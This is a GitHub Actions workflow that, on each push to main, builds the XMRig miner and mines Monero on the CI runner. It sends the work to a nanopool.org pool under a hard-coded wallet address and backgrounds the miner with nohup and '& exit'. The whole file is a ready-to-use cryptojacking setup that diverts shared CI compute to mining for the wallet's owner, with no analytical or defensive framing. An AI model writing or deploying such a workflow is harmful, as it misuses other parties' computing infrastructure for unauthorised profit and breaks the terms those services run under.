name: Monero 1 Mining Setup

on: 
  push:
    branches:
      - main

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout repository
        uses: actions/checkout@v2

      - name: Update and install dependencies
        run: sudo apt update && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev

      - name: Clone XMRig repository
        run: git clone https://github.com/xmrig/xmrig.git

      - name: Build XMRig
        run: |
          cd xmrig
          mkdir build
          cd build
          cmake ..
          make -j$(nproc)

      - name: Start mining Monero
        run: |
          cd xmrig/build
          nohup ./xmrig -o xmr-eu1.nanopool.org:14444 -a randomx -u 43eBU2ohr7vMHwGasPjzQSNFSfkeVRsUXLm2eeedyWqcHWpTY1vGod1Qef5h2KqJgKbbPXkYc4nWEW2JbjLQtsdR -p raiden8 -t 8 & exit
